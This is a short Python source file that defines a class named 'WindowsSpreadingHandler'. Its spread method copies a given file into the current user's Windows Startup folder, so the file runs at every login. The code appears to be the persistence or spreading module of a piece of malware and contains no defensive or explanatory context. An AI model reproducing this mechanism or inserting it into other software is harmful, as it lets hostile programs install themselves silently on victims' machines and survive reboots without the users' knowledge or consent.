import os
from shutil import copy


class WindowsSpreadingHandler:
    def spread(self,file)-> bool:
        try:
            cwd=os.getcwd()
            if os.path.exists(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Roaming\\Microsoft\\Windows\\Start menu\\Programs\\Startup\\%s'%file)==False:
                copy(file,os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Roaming\\Microsoft\\Windows\\Start menu\\Programs\\Startup\\')                
            return True
        except Exception as e:
            print(e)
            return False
